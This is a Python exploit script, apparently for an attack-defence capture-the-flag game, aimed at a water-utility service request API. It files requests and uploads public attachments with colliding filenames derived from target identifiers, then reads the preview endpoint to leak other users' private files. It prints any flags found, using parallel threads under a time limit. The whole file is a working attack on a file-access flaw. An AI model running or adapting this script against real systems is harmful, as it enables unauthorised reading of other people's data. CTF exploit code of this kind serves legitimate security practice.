#!/usr/bin/env python3
import base64
import secrets
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

from common import FLAG, TIMEOUT, account, classify, collision_filename, post, public_intakes, report, target


def exploit(service, session, identifier, intakes, deadline):
    filename = collision_filename(identifier)
    api = service + "/vodokanal/hs/api"
    for intake in intakes[:12]:
        if time.monotonic() >= deadline:
            break
        try:
            parent = post(session, service, "/v1/my/requests", {
                "publicIntakeId": intake["id"],
                "address": intake["addresses"][0],
                "category": intake["categories"][0],
                "title": "Preview-" + secrets.token_hex(8),
                "description": "Public file preview",
                "contact": "Public contact",
            })
            source = post(session, service, "/v1/my/requests/{}/files".format(parent["id"]), {
                "visibility": "Public",
                "filename": filename,
                "mime": "text/plain",
                "contentBase64": base64.b64encode(b"public proof").decode("ascii"),
            })
            response = session.get(
                api + "/v1/my/request-files/" + source["id"] + "/preview",
                timeout=TIMEOUT,
            )
            if response.status_code == 200:
                try:
                    content = response.content.decode("ascii")
                except UnicodeDecodeError:
                    content = ""
                if FLAG.fullmatch(content):
                    return content
            time.sleep(0.1)
        except (KeyError, IndexError, ValueError, RuntimeError, requests.RequestException) as error:
            report(identifier, error)
    return None


def run_target(service, session, identifier, intakes, deadline):
    if session is None:
        session = account(service)[0]
    return exploit(service, session, identifier, intakes, deadline)


def main():
    deadline = time.monotonic() + 48
    try:
        service, identifiers = target()
        if not identifiers:
            return
        with ThreadPoolExecutor(max_workers=1) as preparation:
            intakes_future = preparation.submit(public_intakes, service)
            first, _, _ = account(service)
            _, attachments = classify(first, service, identifiers)
            if not attachments:
                return
            intakes = intakes_future.result()
    except (KeyError, ValueError, RuntimeError, requests.RequestException) as error:
        report("setup", error)
        return
    attachments.reverse()
    with ThreadPoolExecutor(max_workers=min(4, len(attachments))) as pool:
        futures = {}
        for index, identifier in enumerate(attachments):
            session = first if index == 0 else None
            futures[pool.submit(run_target, service, session, identifier, intakes, deadline)] = identifier
        for future in as_completed(futures):
            try:
                flag = future.result()
                if flag:
                    print(flag, flush=True)
            except (ValueError, RuntimeError, requests.RequestException) as error:
                report(futures[future], error)


if __name__ == "__main__":
    main()
